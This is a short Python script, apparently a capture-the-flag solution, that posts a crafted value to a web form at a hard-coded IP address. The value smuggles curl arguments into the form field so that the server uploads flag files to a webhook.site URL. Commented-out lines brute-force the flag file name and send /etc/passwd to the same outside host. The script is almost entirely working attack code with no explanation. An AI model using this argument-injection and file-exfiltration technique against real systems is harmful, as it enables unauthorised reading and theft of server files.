import requests

url = "http://175.45.187.254:31530/"

form_data = {
                "urlInput": "-T /flag_* https://webhook.site/758ffc0c-6b5e-45f9-b3aa-8aafc5e7a328"
}

response = requests.post(url, data=form_data)
print(response.text)

# for i in range(0,100):
#         form_data = {
#                 "urlInput": "-T /flag_" + "?"*i + ".txt https://webhook.site/758ffc0c-6b5e-45f9-b3aa-8aafc5e7a328"
#                 # "urlInput": "-F password=@/etc/passwd https://webhook.site/758ffc0c-6b5e-45f9-b3aa-8aafc5e7a328"
#         }

#         response = requests.post(url, data=form_data)
#         print(response.text)
